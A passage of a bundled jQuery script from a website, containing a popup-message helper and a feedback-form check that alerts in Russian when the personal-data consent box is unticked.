        delay = parseInt( delay );
    }

	if( $('#message-box').length == 0 ){
		$('body').append('<div class="tip-message" id="message-box"><div class="tip-hold"><a href="#" class="btn-close" onclick="$(\'#message-box\').remove();">close</a><span>' + msg + '</span></div></div>');
	} else {
		if( $('#message-box').css('display') == 'none' ){
			$('#message-box').removeClass('red-popup-thor green-popup-thor popup-thor').addClass(cssClass).find('span').html(msg);
		} else {
			$('#message-box').remove();
			$('body').append('<div class="tip-message" id="message-box"><div class="tip-hold"><a href="#" class="btn-close">close</a><span>' + msg + '</span></div></div>');
		}
	}
	$('#message-box').addClass(cssClass);
	$('#message-box').fadeIn(200).delay(delay).fadeOut(400);

    if (callback)
    {
        setTimeout(callback,delay);
    }

}


$(document).ready(function(){
	$('#form_feedback .button[type="submit"]').click(function(){
		if (!$('.jq-checkbox input[name="AGREE"]').is(':checked')){
			alert("Необходимо согласие на обработку персональных данных!");
		}
	});
});
/* End */
;; /* /local/templates/main/js/jquery-3.3.1.min.js?165728115986927*/
; /* /local/templates/main/jsdist/app.js?1657281159309314*/
; /* /local/components/feedback.ajax/js/popup-alert.js?16572811601469*/
